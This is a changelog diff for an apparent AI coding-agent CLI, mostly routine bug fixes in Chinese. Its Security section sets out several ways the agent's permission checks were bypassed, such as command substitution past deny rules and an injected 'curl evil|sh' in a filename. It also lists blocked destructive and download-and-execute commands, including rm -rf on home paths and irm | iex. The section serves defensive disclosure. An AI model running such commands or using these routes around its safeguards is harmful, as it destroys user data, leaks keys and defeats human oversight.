@@ -1,5 +1,121 @@
 ﻿## [Unreleased]
 
+## [12.2.0] - 2026-10-09
+
+### Security（第四轮审查）
+- **auto 模式自动放行 curl/wget GET**：URL 或请求头里的 `$ANTHROPIC_API_KEY` 会被 shell 展开，一条 GET 就能把密钥发出去；手册的
+  auto 行本来就写着“网络请求仍需确认”。现在网络请求（`curl`、`wget`、`iwr`、`irm`）在 auto 模式一律询问；PowerShell 下的
+  `curl`/`wget` 在 pwsh 6+ 是真正的 curl.exe/wget.exe，不再按 Windows PowerShell 5.1 的别名判为只读。竞跑与维护任务的 worker
+  以 auto 模式运行，受同样约束。
+- **自动验证门禁把模型写入的目录名原样拼进 shell 命令**：`done_verify_auto`/`done_verify_tests` 下，模型写出
+  `pkg;curl evil|sh/a.go` 或 `my tool/b.go` 这样的文件后，门禁执行 `go vet ./pkg;curl evil|sh`（第二段作为独立命令运行，
+  不经任何权限判定）或把 `./my tool` 拆成两个包而误报失败。现在 Go 包路径与 pytest 目标只允许 `[A-Za-z0-9._/-]`，其他目录跳过。
+- **deny/ask 规则看不到“程序名是命令替换”的写法**：`$(which rm) -rf x`、`` `which rm` -rf x ``、`& (gcm rm) -rf x`、
+  `$(which git) push` 在 bypass 模式下放行。现在替换后紧跟普通词的行按不可读程序处理，所有 deny/ask 规则生效。
+- **硬拦截漏网补齐**：`env -S 'rm -rf /'`（`-S` 的值就是命令行）；家目录点通配与父目录（`rm -rf ~/.*`、`~/.[!.]*`、`~/.??*`、
+  `~/../*`）；系统盘/家目录的其他拼写（`%SystemDrive%`、`$env:SystemDrive`、`%HOMEDRIVE%%HOMEPATH%`、`${env:USERPROFILE}`、
+  `$USERPROFILE`、`/home/$USER`、`%ProgramFiles%`、`%ProgramData%`、`%APPDATA%` 等）；下载内容的更多执行形式
+  （`curl … | source /dev/stdin`、`(irm …) | iex`、`(iwr …).Content | iex`、`iwr … | % { iex $_.Content }`、
+  `& ([scriptblock]::Create((irm …)))`）；`git -c alias.x='!rm -rf ~' x`；`go test/run -exec 'rm -rf ~'`（也不再算构建命令或
+  常规 go 操作）；包装器 `setsid`、`stdbuf`、`ionice`、`strace`、`flock`、`su -c`、`runuser -c`、`wsl`、cmd `start`、
+  `Start-Process`；块设备 `/dev/mapper/*`、`/dev/md*`、`\\.\C:`；`systemctl poweroff|reboot|halt`、`init 0|6`、`telinit`。
+- 远程监督：`--public-origin`/Host 比较改为不区分大小写（浏览器会把 `https://Phone.Example` 小写发送，之前一律 403）。
+- 被屏蔽落盘的工具输出（`~/.cove/tool-outputs`）改为 0700/0600，`~/.cove/errors.log` 改为 0600：两者都可能含读到的密钥、
+  工具失败输出或 provider 错误正文。
+- 维护任务与竞跑的 `git apply`/补丁捕获加 `--no-textconv`，全局 textconv 驱动不会把二进制改动写成不可应用的文本 diff。
+
+### Fixed（第四轮审查）
+**维护任务（`/automations`、`/inbox`）**
+- **worker 拿不到 API Key**：私有 worker 配置用普通 JSON 序列化写入，API Key 是打码后的 `sk-r****7890`，子进程加载时清空，
+  所有维护任务全部认证失败并按 retries 重复失败。现在写入完整 Key。
+- `tick` 串行跑多个到期任务时，后面的任务用 tick 开始时刻做 claim，2 小时租约在执行中就过期、被别的进程标为 uncertain。
+  现在每个任务按自己的开始时间 claim。
+- 过期的 running claim（worker 崩溃）之前只在 run/tick/event/review 时才转为 uncertain，`/inbox list` 一直显示 running、
+  `/automations remove` 被挡住。现在任何 automation/inbox 命令都先回收过期 claim。
+- 补丁或日志超过 4 MiB 时，被截断的 4 MiB 内容整段塞进 `result.Error`、state.json 和 REPL 错误行；现在错误只带输出尾部，
+  命令失败时只报结果 ID。runner 输出也不再同时存进 `output` 与 `checks[0].output`（看 `checks[0].output`）。
+- Windows 上 spec prompt 超过约 32K 字符时子进程启动失败（命令行上限）；超过 24 KiB 的 prompt 改经 stdin 传入。
+- 文件锁破陈旧锁后不立即重试：job.lock 过期后第一次 run/tick 必报“lock is held by another writer”。
+
+**竞跑（`/race`）**
+- **项目与配置目录不同盘时永远被拒**（`filepath.Rel` 跨卷报错被当成“在项目内”）。
+- 候选子进程丢失当前 profile 的 provider/api_key/model（整体覆盖了 `profiles`）；现在 race-budget profile 建在当前 profile 之上。
+- 生成或验证留下的被忽略文件（`__pycache__`、`node_modules`、`bin/`）让候选直接失败；现在捕获补丁前清掉忽略文件（它们不可能
+  进入补丁，验证器也不应看到）。总超时或取消后，已完整通过验证的候选现在可以 `select`。早退候选的 `generation.status` 不再停在
+  `queued`；一个残缺的 run 目录不再让 `/race list` 整体报错；最后一步 `git apply` 不再被 Ctrl+C 中途杀掉留下半应用的工作树；
+  `workspace.Capture` 在 ctx 超时时不再误报“detached HEAD”。
+
+**远程监督（`/remote`）**
+- **开启后本地待回答的授权提示会被“拒绝”**：本地输入一行指引、远程 steer/pause、队列变化或 5 分钟远程 TTL 到期都会让 scope
+  版本变化，而漂移被当作远程拒绝送给本地提示。现在漂移/过期/替换只撤销远程 pending，本地提示按自己的超时继续等待；远程
+  cancel、`/remote stop` 与退出仍拒绝。远程 `deny` 之前被报成“授权超时”，现在报为拒绝。
+- scope 版本改为按消息文本与附件元数据（类型、文件名、字节数）计算，不再每 250 ms 多次序列化整段 base64 附件。
+
+**引擎**
+- 完成校验门禁重试与自审重试不受 `canNudge` 约束，`-p --max-turns N` 最后一次调用给出答复后仍被打回，答复被“迭代上限”错误取代。
+- 流式输出期间 Ctrl+C 被记为“API error”中断而不是用户取消。
+- `authorizeToolCall` 的 `promptMu` 改为 defer 释放（审批回调 panic 后不再永久阻塞后续审批）；`/record`、`recordEvent` 的开关
+  读写放进锁内；`/export` 标记为任务运行中不可执行，`/status`/`/stats` 改读原子消息计数（不再无锁遍历回合线程拥有的消息切片）。
+- **开启 thinking 时 masking/压缩后的下一次请求可能被 Anthropic 拒绝**：`stripThinkingBlocks` 连最后一条带 tool_use 的 assistant
+  消息的 thinking 块一起删掉，而 API 要求发送该回合的 tool_result 时原样带回这些块。现在只删更早回合的（API 本就忽略它们）；
+  thinking 关闭的请求（收尾总结）不再携带历史里的 thinking 块。
+- 验证门禁、回归验证、dream 的只读命令与 checkpoint 的后台 `git gc` 超时都只杀外层 shell，`go test`/`node`/`grep -r`/`git repack`
+  继续孤儿运行并持着管道（dream 的整理锁一直卡到它自己跑完，checkpoint 的 trim 之后永久停摆）。现在都和 bash 工具一样杀整棵
+  进程树并限时读管道（新包 `internal/proctree`）。
+- `regression_verify` 复用引擎的 checkpoint 管理器，不再与并行子代理的写入争 `index.lock`；checkpoint 的后台维护改用 channel
+  等待，避免 `WaitMaintenance` 与并行 `Create` 撞上 WaitGroup 的 “reused before previous Wait has returned” panic。
+- 子代理 5 分钟超时或被取消时丢弃全部部分结果（只剩 “Sub-agent did not finish: timed out”），现在和步数上限一样返回已完成步骤
+  摘要；计划执行器对这类超时不再从零重跑一遍。
+- 上下文 token 估算把图片 part 按 1600、文件 part 按内容估算（之前计 0，读多张截图后压缩触发滞后）。
+- 会话笔记：英文决策关键词加单词边界（`because`/`mouse` 不再被记成决策）；`/compact` 只有真的压缩了才记录 “Context compacted”。
+- **`worktree` 工具创建的工作树所有文件工具都拒绝访问**：工作树建在 `../<分支>`，而 read/edit/write/glob/grep 只接受工作目录内的
+  路径，模型进入工作树后只能用 shell，错误文案又禁止用 shell 绕过。现在进入工作树后所有工具（含 shell）的工作目录就是该工作树，
+  `exit_worktree` 在原项目目录执行 `git worktree remove` 并切回；检查点/`/undo` 仍只覆盖主工作树（手册已说明）。
+
+**配置、附件、计费**
+- 删除激活中的 profile 后，顶层 `provider` 里旧的 `base_url`/`image_files_api` 不再残留在 profile 的 key 旁边；
+  `cove --profile x --config` 与 `/config` 显示的是带 profile 的配置。
+- `.svg`/`.ico`/`.bmp` 等按扩展名归为 `image/*` 但不是位图的文件不再被整条消息拒绝，按文本/文件附件发送；Flash 模型下超限图片
+  按 4096 而不是 1568 缩放；`--image`/`--file` 不带 `-p` 时报错而不是静默丢弃；`/skill list` 描述按字符而非字节截断。
+- 补 `gpt-5*`、`gpt-4.1*`、`o1`、`o3`、`o4-mini` 的价格与上下文窗口（之前按 $0.435/$0.87 计费、32k 窗口 20k 就压缩、只要
+  8000 输出）。
+
+**插件、记忆、命令、工具**
+- `/plugin refresh` 在 `git pull` 失败（离线、上游 force-push）时不再回答“已更新”，而是报告使用了缓存索引。
+- `/memory remove` 现在和 `/memory add` 一样持记忆写锁，不会被并发的记忆提取“复活”。记忆溯源记录只保留当前修订（旧修订记录
+  每次追加都复制全部历史来源，长期无界增长）；损坏的溯源侧文件不再阻断该记忆的写入。
+- `/ratelimit` 的 “reset in” 现在随时间递减，窗口已过显示“已重置”。
+- `glob` 带 `path` 参数时返回相对工作目录的路径（与 grep 一致），模型按结果 `read` 不再报不存在。
+- 技能目录是符号链接时不再被静默跳过（项目技能解析到项目外仍拒绝）。
+- MCP 的 SSE / Streamable HTTP 连接在服务器接受连接却不回应时永久挂起（启动的 `LoadFromConfig` 与 `/mcp connect` 一起卡死，
+  30 秒启动上限形同虚设）：拨号请求现在有 30 秒响应头超时，事件流正文仍不限时。
+
+**浏览器验收**
+- 子资源域名解析失败或页面被取消不再被判为 `fail/safety_policy`（现在是 `network_unavailable`/忽略）；安全拒绝与无效工作流按
+  文档记为 `unverified` 而非 `fail`；`--allow-local` 下 `localhost` 同时尝试 `127.0.0.1` 与 `::1`，多地址主机逐个拨号；headless
+  渲染的 `browser` 工具不再恒报 `Status: 200`（改为 unknown）；验收证据只在真的降级了什么时才落盘（之前每次 write/edit 都
+  fsync 一次）。
+
+**REPL 与终端**
+- 钉住模式下候选列表固定 7 行高度并在置 `pinned` 之后再度量保留行数，输入 `/hel` 每个按键不再触发“解除钉住→查询光标→重钉”；
+  连续重钉有上限，绘制按保留行数裁剪。
+- Shift+Tab 只在空输入（或从面板切回）时切换 Agent 面板焦点；单独输入 `/` 回车显示快捷命令列表而不是填入第一个候选；多行输入
+  行数不超过终端高度减 2；←/→/Backspace/Delete 按字素簇移动与删除（`a⚠️b` 上光标不再落在 ⚠ 与 U+FE0F 之间，Backspace 一次删掉
+  整个 emoji）；`/keys` 补上 Alt+V、Alt+M、Shift+Tab/空输入 Tab、空输入 Alt+⌫。
+- 诊断：HOME 不可用时不再在当前项目里创建 `./.cove` 并写探测文件（数据目录/磁盘空间/会话完整性三项跳过，telemetry 不落盘）；
+  网络检查用完即关连接。
+
+**文件系统**
+- fsatomic 的根目录原子写先替换再设权限：Windows 上 0444 的临时文件不再让 ReplaceFile 报拒绝访问，POSIX 上 0755 的脚本经
+  `/undo` 恢复后保留可执行位。选择性回滚（`/undo <hash> <文件>`）遇到只读目标文件先清除只读属性再替换/删除，恢复后按检查点里的
+  模式还原。
+
+### 已知未修（第四轮审查记录）
+- automation 的 state.json 仍是单文件整体读写，长期每小时任务下会持续增长，没有清理命令。
+- `/cd` 不切换记忆存储与 dream 整理的项目根（二者仍指向启动时的项目，退出时的 worker 则按当前目录整理）；手册已说明 `/cd`
+  只重载 policies.json。
+- `mobile/mobileapi` 目录仍在源码树中编译，属死代码；是否删除待定。
+
 ## [12.1.0] - 2026-10-08
 
 ### Added
